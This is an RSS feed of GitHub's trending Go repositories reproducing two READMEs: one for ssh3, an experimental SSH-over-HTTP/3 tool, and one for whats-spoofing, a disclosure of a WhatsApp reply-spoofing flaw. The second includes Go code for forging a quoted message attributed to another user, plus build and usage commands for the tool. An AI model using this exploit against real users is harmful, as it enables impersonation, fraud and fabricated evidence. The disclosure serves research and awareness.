<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub Go Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2023-12-19T01:31:08Z</updated>
  <subtitle>Daily Trending of Go in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>francoismichel/ssh3</title>
    <updated>2023-12-19T01:31:08Z</updated>
    <id>tag:github.com,2023-12-19:/francoismichel/ssh3</id>
    <link href="https://github.com/francoismichel/ssh3" rel="alternate"></link>
    <summary type="html">&lt;p&gt;SSH3: faster and rich secure shell using HTTP/3, checkout our article here: https://arxiv.org/abs/2312.08396&lt;/p&gt;&lt;hr&gt;&lt;div align=&#34;center&#34;&gt; &#xA; &lt;img src=&#34;https://raw.githubusercontent.com/francoismichel/ssh3/main/resources/figures/ssh3.png&#34; style=&#34;display: block; width: 60%&#34;&gt; &#xA;&lt;/div&gt; &#xA;&lt;h1&gt;SSH3: faster and rich secure shell using HTTP/3&lt;/h1&gt; &#xA;&lt;p&gt;SSH3 is a complete revisit of the SSH protocol, mapping its semantics on top of the HTTP mechanisms. In a nutshell, SSH3 uses &lt;a href=&#34;https://datatracker.ietf.org/doc/html/rfc9000&#34;&gt;QUIC&lt;/a&gt;+&lt;a href=&#34;https://datatracker.ietf.org/doc/html/rfc8446&#34;&gt;TLS1.3&lt;/a&gt; for secure channel establishment and the &lt;a href=&#34;https://www.rfc-editor.org/rfc/rfc9110.html#name-authorization&#34;&gt;HTTP Authorization&lt;/a&gt; mechanisms for user authentication. Among others, SSH3 allows the following improvements:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Significantly faster session establishment&lt;/li&gt; &#xA; &lt;li&gt;New HTTP authentication methods such as &lt;a href=&#34;https://datatracker.ietf.org/doc/html/rfc6749&#34;&gt;OAuth 2.0&lt;/a&gt; and &lt;a href=&#34;https://openid.net/specs/openid-connect-core-1_0.html&#34;&gt;OpenID Connect&lt;/a&gt; in addition to classical SSH authentication&lt;/li&gt; &#xA; &lt;li&gt;Robustness to port scanning attacks: your SSH3 server can be made &lt;strong&gt;invisible&lt;/strong&gt; to other Internet users&lt;/li&gt; &#xA; &lt;li&gt;UDP port forwarding in addition to classical TCP port forwarding&lt;/li&gt; &#xA; &lt;li&gt;All the features allowed by the modern QUIC protocol: including connection migration (soon) and multipath connections&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;[!TIP] Quickly want to get started ? Checkout how to &lt;a href=&#34;https://raw.githubusercontent.com/francoismichel/ssh3/main/#installing-ssh3&#34;&gt;install SSH3&lt;/a&gt;. You will learn to &lt;a href=&#34;https://raw.githubusercontent.com/francoismichel/ssh3/main/#deploying-an-ssh3-server&#34;&gt;setup an SSH3 server&lt;/a&gt; and &lt;a href=&#34;https://raw.githubusercontent.com/francoismichel/ssh3/main/#using-the-ssh3-client&#34;&gt;use the SSH3 client&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;&lt;em&gt;SSH3&lt;/em&gt; stands for the concatenation of &lt;em&gt;SSH&lt;/em&gt; and &lt;em&gt;H3&lt;/em&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;‚ö° SSH3 is faster&lt;/h2&gt; &#xA;&lt;p&gt;Faster for session establishment, not throughput ! SSH3 offers a significantly faster session establishment than SSHv2. Establishing a new session with SSHv2 can take 5 to 7 network round-trip times, which can easily be noticed by the user. SSH3 only needs 3 round-trip times. The keystroke latency in a running session is unchanged.&lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/francoismichel/ssh3/main/resources/figures/ssh3_100ms_rtt.gif&#34;&gt; &lt;i&gt;SSH3 (top) VS SSHv2 (bottom) session establishement with a 100ms ping towards the server.&lt;/i&gt; &lt;/p&gt; &#xA;&lt;h2&gt;üîí SSH3 is secure&lt;/h2&gt; &#xA;&lt;p&gt;While SSHv2 defines its own protocols for user authentication and secure channel establishment, SSH3 relies on the robust and time-tested mechanisms of TLS 1.3, QUIC and HTTP. These protocols are already extensively used to secure security-critical applications on the Internet such as e-commerce and Internet banking.&lt;/p&gt; &#xA;&lt;p&gt;SSH3 already implements the common password-based and public-key (RSA and EdDSA/ed25519) authentication methods. It also supports new authentication methods such as OAuth 2.0 and allows logging in to your servers using your Google/Microsoft/Github accounts.&lt;/p&gt; &#xA;&lt;h2&gt;ü•∑ Your SSH3 public server can be hidden&lt;/h2&gt; &#xA;&lt;p&gt;Using SSH3, you can avoid the usual stress of scanning and dictionnary attacks against your SSH server. Similarly to your secret Google Drive documents, your SSH3 server can be hidden behind a secret link and only answer to authentication attempts that made an HTTP request to this specific link, like the following:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;ssh3-server -bind 192.0.2.0:443 -url-path &amp;lt;my-long-secret&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;By replacing &lt;code&gt;&amp;lt;my-long-secret&amp;gt;&lt;/code&gt; by, let&#39;s say, the random value &lt;code&gt;M3MzkxYWMxMjYxMjc5YzJkODZiMTAyMjU&lt;/code&gt;, your SSH3 server will only answer to SSH3 connection attempts made to the URL &lt;code&gt;https://192.0.2.0:443/M3MzkxYWMxMjYxMjc5YzJkODZiMTAyMjU&lt;/code&gt; and it will respond a &lt;code&gt;404 Not Found&lt;/code&gt; to other requests. Attackers and crawlers on the Internet can therefore not detect the presence of your SSH3 server. They will only see a simple web server answering 404 status codes to every request.&lt;/p&gt; &#xA;&lt;h2&gt;üíê SSH3 is already feature-rich&lt;/h2&gt; &#xA;&lt;p&gt;SSH3 provides new feature that could not be provided by the SSHv2 protocol.&lt;/p&gt; &#xA;&lt;h3&gt;Brand new features&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;strong&gt;UDP port forwarding&lt;/strong&gt;: you can now access your QUIC, DNS, RTP or any UDP-based server that are only reachable from your SSH3 host. UDP packets are forwarded using QUIC datagrams.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;X.509 certificates&lt;/strong&gt;: you can now use your classical HTTPS cerificates to authenticate your SSH3 server. This mechanism is more secure than the classical SSHv2 host key mechanism. Certificates can be obtained easily using LetsEncrypt for instance.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Hiding&lt;/strong&gt; your server behind a secret link.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Keyless&lt;/strong&gt; secure user authentication using &lt;strong&gt;OpenID Connect&lt;/strong&gt;. You can connect to your SSH3 server using the SSO of your company or your Google/Github account, and you don&#39;t need to copy the public keys of your users anymore.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Famous OpenSSH features implemented&lt;/h3&gt; &#xA;&lt;p&gt;This SSH3 implementation already provides many of the popular features of OpenSSH, so if you are used to OpenSSH, the process of adopting SSH3 will be smooth. Here is a list of some OpenSSH features that SSH3 also implements:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Parses &lt;code&gt;~/.ssh/authorized_keys&lt;/code&gt; on the server&lt;/li&gt; &#xA; &lt;li&gt;Parses &lt;code&gt;~/.ssh/config&lt;/code&gt; on the client and handles the &lt;code&gt;Hostname&lt;/code&gt;, &lt;code&gt;User&lt;/code&gt;, &lt;code&gt;Port&lt;/code&gt; and &lt;code&gt;IdentityFile&lt;/code&gt; config options (the other options are currently ignored)&lt;/li&gt; &#xA; &lt;li&gt;Certificate-based server authentication&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;known_hosts&lt;/code&gt; mechanism when X.509 certificates are not used.&lt;/li&gt; &#xA; &lt;li&gt;Automatically using the &lt;code&gt;ssh-agent&lt;/code&gt; for public key authentication&lt;/li&gt; &#xA; &lt;li&gt;SSH agent forwarding to use your local keys on your remote server&lt;/li&gt; &#xA; &lt;li&gt;Direct TCP port forwarding (reverse port forwarding will be implemented in the future)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Installing SSH3&lt;/h2&gt; &#xA;&lt;p&gt;You can either download the last &lt;a href=&#34;https://github.com/francoismichel/ssh3/releases&#34;&gt;release binaries&lt;/a&gt; or generate these binaries yourself by compiling the code from source.&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;[!TIP] SSH3 is still experimental and is the fruit of a research work. If you are afraid of deploying publicly a new SSH3 server, you can use the &lt;a href=&#34;https://raw.githubusercontent.com/francoismichel/ssh3/main/#-your-ssh3-public-server-can-be-hidden&#34;&gt;secret path&lt;/a&gt; feature of SSH3 to hide it behing a secret URL.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h3&gt;Compiling SSH3 from source&lt;/h3&gt; &#xA;&lt;p&gt;You need a recent &lt;a href=&#34;https://go.dev/dl/&#34;&gt;Golang&lt;/a&gt; version to do this. Downloading the source code and compiling the binaries can be done with the following steps:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://github.com/francoismichel/ssh3    # clone the repo&#xA;cd ssh3&#xA;go build -o ssh3 cli/client/main.go                        # build the client&#xA;CGO_ENABLED=1 go build -o ssh3-server cli/server/main.go   # build the server, requires having gcc installed&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you have root/sudo priviledges and you want to make ssh3 accessible to all you users, you can then directly copy the binaries to &lt;code&gt;/usr/bin&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;cp ssh3 /usr/bin/ &amp;amp;&amp;amp; cp ssh3-server /usr/bin&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Otherwise, you can simply add the executables to your &lt;code&gt;PATH&lt;/code&gt; environment variable by adding the following line at the end of your &lt;code&gt;.bashrc&lt;/code&gt; or equivalent:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;export PATH=$PATH:/path/to/the/ssh3/directory&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Deploying an SSH3 server&lt;/h3&gt; &#xA;&lt;p&gt;Before connecting to your host, you need to deploy an SSH3 server on it. There is currently no SSH3 daemon, so right now, you will have to run the &lt;code&gt;ssh3-server&lt;/code&gt; executable in background using &lt;code&gt;screen&lt;/code&gt; or a similar utility.&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;[!NOTE]&lt;br&gt; As SSH3 runs on top of HTTP/3, a server needs an X.509 certificate and its corresponding private key. If you do not want to generate a certificate signed by a real certificate authority, you can generate a self-signed one using the &lt;code&gt;generate_openssl_selfsigned_certificate.sh&lt;/code&gt; script. This provides you with similar security guarantees to SSHv2&#39;s host keys mechanism, with the same security issue: you may be vulnerable to machine-in-the-middle attacks during your first connection to your server. Using real certificates signed by public certificate authorities such as Let&#39;s Encrypt avoids this issue.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;Here is the usage of the &lt;code&gt;ssh3-server&lt;/code&gt; executable:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Usage of ./ssh3-server:&#xA;  -bind string&#xA;        the address:port pair to listen to, e.g. 0.0.0.0:443 (default &#34;[::]:443&#34;)&#xA;  -cert string&#xA;        the filename of the server certificate (or fullchain) (default &#34;./cert.pem&#34;)&#xA;  -enable-password-login&#xA;        if set, enable password authentication (disabled by default)&#xA;  -generate-selfsigned-cert&#xA;        if set, generates a self-self-signed cerificate and key that will be stored&#xA;        at the paths indicated by the -cert and -key args (they must not already exist)&#xA;  -key string&#xA;        the filename of the certificate private key (default &#34;./priv.key&#34;)&#xA;  -url-path string&#xA;        the secret URL path on which the ssh3 server listens (default &#34;/ssh3-term&#34;)&#xA;  -v    verbose mode, if set&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The following command starts a public SSH3 server on port 443 and answers to new sessions requests querying the &lt;code&gt;/ssh3&lt;/code&gt; URL path:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;ssh3-server -cert /path/to/cert/or/fullchain -key /path/to/cert/private/key -url-path /ssh3&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;[!NOTE] Similarly to OpenSSH, the server must be run with root priviledges to log in as other users.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h4&gt;Authorized keys and authorized identities&lt;/h4&gt; &#xA;&lt;p&gt;By default, the SSH3 server will look for identities in the &lt;code&gt;~/.ssh/authorized_keys&lt;/code&gt; and &lt;code&gt;~/.ssh3/authorized_identities&lt;/code&gt; files for each user. &lt;code&gt;~/.ssh3/authorized_identities&lt;/code&gt; allows new identities such as OpenID Connect (&lt;code&gt;oidc&lt;/code&gt;) discussed &lt;a href=&#34;https://raw.githubusercontent.com/francoismichel/ssh3/main/#openid-connect-authentication-still-experimental&#34;&gt;below&lt;/a&gt;. Popular key types such as &lt;code&gt;rsa&lt;/code&gt;, &lt;code&gt;ed25519&lt;/code&gt; and keys in the OpenSSH format can be used.&lt;/p&gt; &#xA;&lt;h3&gt;Using the SSH3 client&lt;/h3&gt; &#xA;&lt;p&gt;Once you have an SSH3 server running, you can connect to it using the SSH3 client similarly to what you did with your classical SSHv2 tool.&lt;/p&gt; &#xA;&lt;p&gt;Here is the usage of the &lt;code&gt;ssh3&lt;/code&gt; executable:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Usage of ssh3:&#xA;  -pubkey-for-agent string&#xA;        if set, use an agent key whose public key matches the one in the specified path&#xA;  -privkey string&#xA;        private key file&#xA;  -use-password&#xA;        if set, do classical password authentication&#xA;  -forward-agent&#xA;        if set, forwards ssh agent to be used with sshv2 connections on the remote host&#xA;  -forward-tcp string&#xA;        if set, take a localport/remoteip@remoteport forwarding localhost@localport towards remoteip@remoteport&#xA;  -forward-udp string&#xA;        if set, take a localport/remoteip@remoteport forwarding localhost@localport towards remoteip@remoteport&#xA;  -insecure&#xA;        if set, skip server certificate verification&#xA;  -keylog string&#xA;        Write QUIC TLS keys and master secret in the specified keylog file: only for debugging purpose&#xA;  -use-oidc string&#xA;        if set, force the use of OpenID Connect with the specified issuer url as parameter&#xA;  -oidc-config string&#xA;        OpenID Connect json config file containing the &#34;client_id&#34; and &#34;client_secret&#34; fields needed for most identity providers&#xA;  -do-pkce&#xA;        if set, perform PKCE challenge-response with oidc&#xA;  -v    if set, enable verbose mode&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Private-key authentication&lt;/h4&gt; &#xA;&lt;p&gt;You can connect to your SSH3 server at my-server.example.org listening on &lt;code&gt;/my-secret-path&lt;/code&gt; using the private key located in &lt;code&gt;~/.ssh/id_rsa&lt;/code&gt; with the following command:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;  ssh3 -privkey ~/.ssh/id_rsa username@my-server.example.org/my-secret-path&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Agent-based private key authentication&lt;/h4&gt; &#xA;&lt;p&gt;The SSH3 client works with the OpenSSH agent and uses the classical &lt;code&gt;SSH_AUTH_SOCK&lt;/code&gt; environment variable to communicate with this agent. Similarly to OpenSSH, SSH3 will list the keys provided by the SSH agent and connect using the first key listen by the agent by default. If you want to specify a specific key to use with the agent, you can either specify the private key directly with the &lt;code&gt;-privkey&lt;/code&gt; argument like above, or specify the corresponding public key using the &lt;code&gt;-pubkey-for-agent&lt;/code&gt; argument. This allows you to authenticate in situations where only the agent has a direct access to the private key but you only have access to the public key.&lt;/p&gt; &#xA;&lt;h4&gt;Password-based authentication&lt;/h4&gt; &#xA;&lt;p&gt;While discouraged, you can connect to your server using passwords (if explicitly enabled on the &lt;code&gt;ssh3-server&lt;/code&gt;) with the following command:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;  ssh3 -use-password username@my-server.example.org/my-secret-path&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Config-based session establishment&lt;/h4&gt; &#xA;&lt;p&gt;&lt;code&gt;ssh3&lt;/code&gt; parses your OpenSSH config. Currently, it only handles the &lt;code&gt;Hostname&lt;/code&gt;; &lt;code&gt;User&lt;/code&gt;, &lt;code&gt;Port&lt;/code&gt; and &lt;code&gt;IdentityFile&lt;/code&gt; options. Let&#39;s say you have the following lines in your OpenSSH config located in &lt;code&gt;~/.ssh/config&lt;/code&gt; :&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Host my-server&#xA;  HostName 192.0.2.0&#xA;  User username&#xA;  IdentityFile ~/.ssh/id_rsa&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Similarly to what OpenSSH does, the following &lt;code&gt;ssh3&lt;/code&gt; command will connect you to the SSH3 server running on 192.0.2.0 on UDP port 443 using public key authentication with the private key located in &lt;code&gt;.ssh/id_rsa&lt;/code&gt; :&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;  ssh3 my-server/my-secret-path&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you do not want a config-based utilization of SSH3, you can read the sections below to see how to use the CLI parameters of &lt;code&gt;ssh3&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h4&gt;OpenID Connect authentication (still experimental)&lt;/h4&gt; &#xA;&lt;p&gt;This feature allows you to connect using an external identity provider such as the one of your company or any other provider that implements the OpenID Connect standard, such as Google Identity, Github or Microsoft Entra. The authentication flow is illustrated in the GIF below.&lt;/p&gt; &#xA;&lt;div align=&#34;center&#34;&gt; &#xA; &lt;img src=&#34;https://raw.githubusercontent.com/francoismichel/ssh3/main/resources/figures/ssh3_oidc.gif&#34; width=&#34;75%&#34;&gt; &#xA; &lt;p&gt;&lt;em&gt;Secure connection without private key using a Google account.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;/div&gt; &#xA;&lt;p&gt;The way it connects to your identity provider is configured in a file named &lt;code&gt;~/.ssh3/oidc_config.json&lt;/code&gt;. Below is an example &lt;code&gt;config.json&lt;/code&gt; file for use with a Google account. This configuration file is an array and can contain several identity providers configurations.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;[&#xA;    {&#xA;        &#34;issuer_url&#34;: &#34;https://accounts.google.com&#34;,&#xA;        &#34;client_id&#34;: &#34;&amp;lt;your_client_id&amp;gt;&#34;, &#xA;        &#34;client_secret&#34;: &#34;&amp;lt;your_client_secret&amp;gt;&#34;&#xA;    }&#xA;]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This might change in the future, but currently, to make this feature work with your Google account, you will need to setup a new experimental application in your Google Cloud console and add your email as authorized users. This will provide you with a &lt;code&gt;client_id&lt;/code&gt; and a &lt;code&gt;client_secret&lt;/code&gt; that you can then set in your &lt;code&gt;~/.ssh3/oidc_config.json&lt;/code&gt;. On the server side, you just have to add the following line in your &lt;code&gt;~/.ssh3/authorized_identities&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;oidc &amp;lt;client_id&amp;gt; https://accounts.google.com &amp;lt;email&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;We currently consider removing the need of setting the client_id in the &lt;code&gt;authorized_identities&lt;/code&gt; file in the future.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>lichti/whats-spoofing</title>
    <updated>2023-12-19T01:31:08Z</updated>
    <id>tag:github.com,2023-12-19:/lichti/whats-spoofing</id>
    <link href="https://github.com/lichti/whats-spoofing" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Whatsapp Exploit to spoofing impersonate of reply message&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Whatsapp Spoofing impersonate of reply message&lt;/h1&gt; &#xA;&lt;p&gt;All official WhatsApp clients, upon receiving a &#34;Message Reply&#34; payload (QuotedMessage), do not validate whether the &#34;ContextInfo&#34; of this &#34;QuotedMessage&#34; is valid/exists (&#34;StanzaId&#34; and &#34;Participant&#34;). This allows a malicious actor to send in private chats or groups a &#34;QuotedMessage&#34; of a message that never existed on behalf of another person. This is highly critical and dangerous.&lt;/p&gt; &#xA;&lt;h2&gt;Impact&lt;/h2&gt; &#xA;&lt;p&gt;Malicious individuals can use this to create issues such as:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Arguments between couples&lt;/li&gt; &#xA; &lt;li&gt;Sextortion scams&lt;/li&gt; &#xA; &lt;li&gt;Frauds against financial institutions&lt;/li&gt; &#xA; &lt;li&gt;In Brazil, someone could take a cellphone to a notary office to register a &#34;Notarial Act&#34; to create a record that could be used in legal proceedings, claiming that the original message was deleted but keeping the evidence of the &#34;QuotedMessage.&#34;&lt;/li&gt; &#xA; &lt;li&gt;Creating embarrassing situations involving public figures (famous actors, politicians, etc.)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;What Meta/Facebook said about this&lt;/h2&gt; &#xA;&lt;p&gt;Hi Gustavo,&lt;/p&gt; &#xA;&lt;p&gt;Thanks for your report. This issue has been reported to us before, and we consider it to be an accepted risk. When someone replies to a message, the WhatsApp client copies the text available within the app and creates a graphical representation that helps people follow the conversation, the owner of this quoted message is always the person replying to the original message. WhatsApp uses end to end encryption and doesn‚Äôt store messages on its servers, therefore we don‚Äôt have a single source of truth for these messages. People always have the option of blocking a sender who tries to spoof messages and they can report problematic content to us. Although we appreciate the report, such issues do not qualify under our bug bounty program.&lt;/p&gt; &#xA;&lt;p&gt;Thanks,&lt;/p&gt; &#xA;&lt;p&gt;Teo&lt;/p&gt; &#xA;&lt;h2&gt;App Versions&lt;/h2&gt; &#xA;&lt;p&gt;Latest version on all platforms&lt;/p&gt; &#xA;&lt;h2&gt;The problem&lt;/h2&gt; &#xA;&lt;p&gt;Users: UserA, UserB; UserA is not known by UserB&lt;/p&gt; &#xA;&lt;p&gt;UserA (SCAMMER) sends a spoofed messages to UserB in response to a message that UserB did never send&lt;/p&gt; &#xA;&lt;p&gt;Spoofed message payload:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;msg := &amp;amp;waProto.Message{&#xA;    ExtendedTextMessage: &amp;amp;waProto.ExtendedTextMessage{&#xA;        Text: proto.String(&#34;Some text&#34;),&#xA;        ContextInfo: &amp;amp;waProto.ContextInfo{&#xA;            StanzaId:     proto.String(&#34;Some Random ID&#34;), //Random ID&#xA;            Participant: proto.String(&#34;5511999999999@s.whatsapp.net&#34;), //Spoofed user ID&#xA;            QuotedMessage: &amp;amp;waProto.Message{&#xA;                Conversation: proto.String(&#34;Some Spoofed text&#34;), //QuotedMessage Spoofed text&#xA;            },&#xA;        },&#xA;    },&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Send the Spoofed Payload:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;resp, err := cli.SendMessage(context.Background(), chatID, msg) &#xA;// chatID is the ID of the chat you want to send the message to, can be a group or the same number as the spoofed user ID&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;POC&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://youtu.be/_WL6hpAvNh8&#34;&gt;Watch the video&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://youtu.be/_WL6hpAvNh8&#34;&gt;&lt;img src=&#34;https://img.youtube.com/vi/_WL6hpAvNh8/hqdefault.jpg&#34; alt=&#34;Watch the video&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/lichti/whats-spoofing/main/files/poc_whatsapp_spoofing-impersonate-of-reply-message.png&#34; alt=&#34;poc_whatsapp_spoofing-impersonate-of-reply-message.png&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Exploit&lt;/h2&gt; &#xA;&lt;h4&gt;Clone the repository.&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://github.com/lichti/whats-spoofing.git&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Install dependencies.&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;cd whats-spoofing&#xA;go mod download&#xA;go get &#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Build&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;go build &#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Running&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;./whats-spoofing&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Usage&lt;/h3&gt; &#xA;&lt;h4&gt;Retrieve Group Information&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-txt&#34;&gt;getgroup &amp;lt;jid&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;List Groups&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-txt&#34;&gt;listgroups&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Send Spoofed Reply&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-txt&#34;&gt;send-spoofed-reply &amp;lt;chat_jid&amp;gt; &amp;lt;msgID:!|#ID&amp;gt; &amp;lt;spoofed_jid&amp;gt; &amp;lt;spoofed_text&amp;gt;|&amp;lt;text&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Send Spoofed Image Reply&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-txt&#34;&gt;send-spoofed-img-reply &amp;lt;chat_jid&amp;gt; &amp;lt;msgID:!|#ID&amp;gt; &amp;lt;spoofed_jid&amp;gt; &amp;lt;spoofed_file&amp;gt; &amp;lt;spoofed_text&amp;gt;|&amp;lt;text&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Send Spoofed Demo Message&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-txt&#34;&gt;send-spoofed-demo &amp;lt;toGender:boy|girl&amp;gt; &amp;lt;language:br|en&amp;gt; &amp;lt;chat_jid&amp;gt; &amp;lt;spoofed_jid&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Send Spoofed Demo Message with Image&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-txt&#34;&gt;send-spoofed-demo-img &amp;lt;toGender:boy|girl&amp;gt; &amp;lt;language:br|en&amp;gt; &amp;lt;spoofed_jid&amp;gt; &amp;lt;spoofed_img&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt;</summary>
  </entry>
</feed>